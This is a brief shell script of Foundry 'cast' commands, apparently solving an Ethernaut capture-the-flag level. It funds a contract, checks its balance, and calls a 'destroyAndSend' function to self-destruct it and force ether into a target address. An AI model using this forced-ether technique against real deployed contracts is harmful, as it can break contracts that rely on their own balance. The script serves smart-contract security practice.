source ~/ethernauts/.env

cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0x9e4664E4De183E8DF23EAC0E5ba9eA35a876Fb24 \
    --value 0.001ether

cast balance 0x9e4664E4De183E8DF23EAC0E5ba9eA35a876Fb24 --rpc-url $RPC_URL


cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0x9e4664E4De183E8DF23EAC0E5ba9eA35a876Fb24 \
    "destroyAndSend(address)()" \
    0x28a55df7F381f6428fB32a0a8862Ed8b4f1Cf93E
